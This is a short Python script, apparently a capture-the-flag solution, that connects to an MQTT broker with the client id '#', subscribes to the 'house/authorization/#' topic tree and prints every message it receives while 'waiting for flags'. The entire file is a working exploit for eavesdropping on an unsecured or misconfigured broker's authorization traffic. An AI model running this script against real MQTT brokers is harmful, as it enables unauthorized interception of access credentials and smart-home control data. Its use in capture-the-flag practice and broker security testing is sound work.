#!/usr/bin/env python3

import paho.mqtt.client as mqtt
import sys

def on_connect(client, userdata, flags, rc):
    print("Connected to MQTT broker.")
    client.subscribe("house/authorization/#")
    print("Subscribed to topic 'house/authorization/#'.")
    print("Waiting for flags...")

def on_message(client, userdata, msg):
    print(msg.payload)

def exploit(host):
    client = mqtt.Client(client_id="#", clean_session=True)
    client.on_connect = on_connect
    client.on_message = on_message

    print("Connecting to MQTT broker on %s" % host)
    client.connect(host, 1883, 60)
    client.loop_forever()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('USAGE: %s <host>' % sys.argv[0])
        exit(-1)

    sys.exit(exploit(sys.argv[1]))
